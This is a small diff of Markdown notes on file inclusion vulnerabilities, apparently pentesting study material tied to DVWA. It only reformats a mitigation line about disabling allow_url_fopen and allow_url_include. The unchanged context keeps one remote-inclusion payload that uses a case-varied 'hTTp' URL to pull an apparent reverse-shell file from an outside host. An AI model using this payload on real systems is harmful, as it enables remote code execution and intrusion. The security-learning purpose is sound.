@@ -20,7 +20,7 @@
   - ```?page=hTTp://10.20.14.203/reverse.txt?```
 
 - Mitigation
-  -  Disable *"allow_url_fopen = On"* & *"allow_url_include = On"*
+  -  Disable ```allow_url_fopen = On``` & ```allow_url_include = On```
 
 ## Example
   - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  
